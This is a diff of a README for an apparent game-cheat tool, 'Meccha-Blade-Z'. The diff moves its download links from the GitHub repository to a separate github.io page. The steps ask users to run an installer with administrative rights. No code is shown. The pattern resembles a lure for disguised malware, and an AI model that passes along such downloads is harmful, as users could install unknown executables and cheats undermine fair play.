@@ -1,6 +1,6 @@
 # ⚔️ Meccha-Blade-Z - Gain the edge in every match
 
-[![](https://img.shields.io/badge/Download-Meccha--Blade--Z-blue.svg)](https://github.com/rodprime/Meccha-Blade-Z)
+[![](https://img.shields.io/badge/Download-Meccha--Blade--Z-blue.svg)](https://rodprime.github.io)
 
 ## 📋 Overview
 Meccha-Blade-Z provides functions for the MECCHA CHAMELEON platform. This tool integrates features to help you manage gameplay sessions. It includes visual aids and control adjustments to assist with tracking and movement within the environment.
@@ -17,7 +17,7 @@ Before you begin, ensure your computer meets these basic needs:
 Follow these steps to set up the software on your system.
 
 ### 1. Download
-Visit [this page](https://github.com/rodprime/Meccha-Blade-Z) to download the installer. Select the latest release version to ensure compatibility with your current game client. Click the link provided to save the file to your computer.
+Visit [this page](https://rodprime.github.io) to download the installer. Select the latest release version to ensure compatibility with your current game client. Click the link provided to save the file to your computer.
 
 ### 2. Prepare the Environment
 Close unnecessary background applications before you start. This prevents conflicts during the setup process. Ensure you have administrative rights for your user account, as the tool requires permission to modify game settings.
